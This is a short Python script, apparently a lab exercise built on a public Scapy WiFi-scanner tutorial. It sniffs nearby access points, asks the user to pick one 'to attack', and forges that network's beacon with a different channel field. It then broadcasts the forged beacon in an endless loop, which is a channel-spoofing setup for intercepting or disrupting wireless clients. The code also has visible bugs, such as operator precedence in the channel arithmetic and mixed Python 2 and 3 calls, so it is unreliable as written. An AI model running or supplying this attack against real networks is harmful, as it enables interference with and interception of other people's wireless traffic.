#based : https://www.thepythoncode.com/code/building-wifi-scanner-in-python-scapy

from scapy.all import *
from threading import Thread
import pandas
import time
import os
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("interface", help="network interface")
parser.add_argument("seconds", help="time in seconds to sniff before selecting", type=int)
args = parser.parse_args()
counter = 0

# initialize the networks dataframe that will contain all access points nearby
networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Beacon"])
# set the index BSSID (MAC address of the AP)
networks.set_index("BSSID", inplace=True)

def callback(packet):
    global counter
    if packet.haslayer(Dot11Beacon):
        # extract the MAC address of the network
        bssid = packet[Dot11].addr2
        # get the name of it
        ssid = packet[Dot11Elt].info.decode('utf-8')
        try:
            dbm_signal = packet.dBm_AntSignal
        except:
            dbm_signal = "N/A"
        # extract network stats
        stats = packet[Dot11Beacon].network_stats()
        # get the channel of the AP
        channel = stats.get("channel")
        networks.loc[bssid] = (ssid, dbm_signal, channel, packet)



def print_all():
    global stop_print
    while True:
        if stop_print:
            break;
        os.system("clear")
        print(networks[["SSID","Channel"]])
        time.sleep(0.5)


def change_channel():
    ch = 1
    while True:
        os.system("iwconfig " + args.interface + " channel " + str(ch))
        ch = ch % 14 + 1
        time.sleep(0.5)


if __name__ == "__main__":
    stop_print=False

    # start the thread that prints all the networks
    printer = Thread(target=print_all)
    printer.daemon = True
    printer.start()
    # start the channel changer
    channel_changer = Thread(target=change_channel)
    channel_changer.daemon = True
    channel_changer.start()

    # start sniffing
    sniff(prn=callback, iface=args.interface, timeout=args.seconds)
    stop_print = True
    input = raw_input("\nChoisir un AP a attaquer : ")
    APToAttack = networks.loc[input , : ]
    ChannelToAttack =  APToAttack.Channel + 6 % 14
    print("Channel %d: Channel to attack %s", APToAttack.Channel, chr(ChannelToAttack))
    
    post = APToAttack.Beacon.getlayer(6)
    APToAttack.Beacon.getlayer(4).remove_payload()                                                                                                                                                                                                             
    forged = APToAttack.Beacon / Dot11Elt(ID="DSset", len=1, info=chr(ChannelToAttack)) / post

    print(forged.summary())
    send(forged, loop=1)


    #generate beacon 
    